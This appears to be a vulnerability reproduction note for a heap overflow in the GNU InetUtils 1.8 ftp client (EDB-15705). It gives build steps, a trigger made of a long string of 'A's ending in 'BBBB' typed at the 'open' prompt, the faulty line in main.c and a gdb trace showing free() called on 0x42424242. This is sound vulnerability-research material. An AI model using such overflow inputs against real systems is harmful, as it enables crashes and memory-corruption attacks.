# EDB-15705

## Experiment Environment

Ubuntu 14.04 LTS

Ubuntu 10.04 LTS

## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/raw/master/EDB-15705/inetutils-1.8.tar.gz

tar -xvf inetutils-1.8.tar.gz
cd inetutils-1.8

./configure
make
```

## Problems in Installation & Configuration

## How to trigger vulnerability

./ftp
ftp> open
(to) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

## PoCs

[GNU InetUtils 1.8-1 - FTP Client Heap Overflow](https://www.exploit-db.com/exploits/15705/)

## Vulnerability Details & Patch

### Root Cause

```
ftp/main.c:475

      *ap++ = *sb++;            /* add character to token */
```

### Stack Trace

```
#0  *__GI___libc_free (mem=0x42424242) at malloc.c:3709
#1  0x08053829 in cmdscanner (top=1) at main.c:326
#2  0x08053d68 in main (argc=<value optimized out>, argv=0xbfcf74d4) at main.c:247
```

## References
